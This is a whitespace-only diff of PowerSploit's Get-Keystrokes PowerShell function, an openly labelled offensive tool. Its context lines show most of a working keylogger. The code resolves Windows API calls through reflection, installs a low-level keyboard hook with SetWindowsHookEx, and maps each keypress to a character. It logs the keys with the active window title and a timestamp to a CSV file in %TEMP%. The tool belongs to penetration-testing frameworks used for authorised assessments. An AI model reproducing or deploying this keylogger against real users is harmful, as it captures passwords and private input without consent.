@@ -3,14 +3,14 @@ function Get-Keystrokes {
 .SYNOPSIS
 
     Logs keys pressed, time and the active window.
-    
+
     PowerSploit Function: Get-Keystrokes
     Original Authors: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
     Revised By: Jesse Davis (@secabstraction)
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
-    
+
 .PARAMETER LogPath
 
     Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.
@@ -30,14 +30,14 @@ function Get-Keystrokes {
 .EXAMPLE
 
     Get-Keystrokes -Timeout 20
-    
+
 .LINK
 
     http://www.obscuresec.com/
     http://www.exploit-monday.com/
     https://github.com/secabstraction
 #>
-    [CmdletBinding()] 
+    [CmdletBinding()]
     Param (
         [Parameter(Position = 0)]
         [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent -Path $_)) -PathType Container})]
@@ -67,11 +67,11 @@ function Get-Keystrokes {
         function local:Get-DelegateType {
             Param (
                 [OutputType([Type])]
-            
+
                 [Parameter( Position = 0)]
                 [Type[]]
                 $Parameters = (New-Object Type[](0)),
-            
+
                 [Parameter( Position = 1 )]
                 [Type]
                 $ReturnType = [Void]
@@ -86,17 +86,17 @@ function Get-Keystrokes {
             $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
             $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
             $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+
             $TypeBuilder.CreateType()
         }
         function local:Get-ProcAddress {
             Param (
                 [OutputType([IntPtr])]
-        
+
                 [Parameter( Position = 0, Mandatory = $True )]
                 [String]
                 $Module,
-            
+
                 [Parameter( Position = 1, Mandatory = $True )]
                 [String]
                 $Procedure
@@ -113,7 +113,7 @@ function Get-Keystrokes {
             $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
             $tmpPtr = New-Object IntPtr
             $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-        
+
             # Return the address of the function
             $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
         }
@@ -161,7 +161,7 @@ function Get-Keystrokes {
         $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
 	    $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
 	    $GetModuleHandle = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
-    
+
         #endregion Imports
 
         $CallbackScript = {
@@ -177,12 +177,12 @@ function Get-Keystrokes {
             )
 
             $Keys = [Windows.Forms.Keys]
-        
+
             $MsgType = $wParam.ToInt32()
 
             # Process WM_KEYDOWN & WM_SYSKEYDOWN messages
             if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
-            
+
                 $hWindow = $GetForegroundWindow.Invoke()
 
                 $ShiftState = $GetAsyncKeyState.Invoke($Keys::ShiftKey)
@@ -219,8 +219,8 @@ function Get-Keystrokes {
                         111 { $Key = "/" }
                     }
                 }
-                elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {                      
-                    if ($Shift) {                           
+                elseif (($vKey -ge 48 -and $vKey -le 57) -or ($vKey -ge 186 -and $vKey -le 192) -or ($vKey -ge 219 -and $vKey -le 222)) {
+                    if ($Shift) {
                         switch ($vKey.value__) { # Shiftable characters
                             48 { $Key = ')' }
                             49 { $Key = '!' }
@@ -245,7 +245,7 @@ function Get-Keystrokes {
                             222 { $Key = '<Double Quotes>' }
                         }
                     }
-                    else {                           
+                    else {
                         switch ($vKey.value__) {
                             48 { $Key = '0' }
                             49 { $Key = '1' }
@@ -285,7 +285,7 @@ function Get-Keystrokes {
                         $Keys::F10 { $Key = '<F10>' }
                         $Keys::F11 { $Key = '<F11>' }
                         $Keys::F12 { $Key = '<F12>' }
-			
+
                         $Keys::Snapshot    { $Key = '<Print Screen>' }
                         $Keys::Scroll      { $Key = '<Scroll Lock>' }
                         $Keys::Pause       { $Key = '<Pause/Break>' }
@@ -329,7 +329,7 @@ function Get-Keystrokes {
                 }
 
                 $obj = New-Object psobject -Property $Props
-            
+
                 # Stupid hack since Export-CSV doesn't have an append switch in PSv2
                 $CSVEntry = ($obj | Select-Object Key,Window,Time | ConvertTo-Csv -NoTypeInformation)[1]
 
@@ -342,14 +342,14 @@ function Get-Keystrokes {
         # Cast scriptblock as LowLevelKeyboardProc callback
         $Delegate = Get-DelegateType @([Int32], [IntPtr], [IntPtr]) ([IntPtr])
         $Callback = $CallbackScript -as $Delegate
-    
+
         # Get handle to PowerShell for hook
         $PoshModule = (Get-Process -Id $PID).MainModule.ModuleName
         $ModuleHandle = $GetModuleHandle.Invoke($PoshModule)
 
         # Set WM_KEYBOARD_LL hook
         $Hook = $SetWindowsHookEx.Invoke(0xD, $Callback, $ModuleHandle, 0)
-    
+
         $Stopwatch = [Diagnostics.Stopwatch]::StartNew()
 
         while ($true) {
@@ -359,7 +359,7 @@ function Get-Keystrokes {
         }
 
         $Stopwatch.Stop()
-    
+
         # Remove the hook
         $UnhookWindowsHookEx.Invoke($Hook)
     }
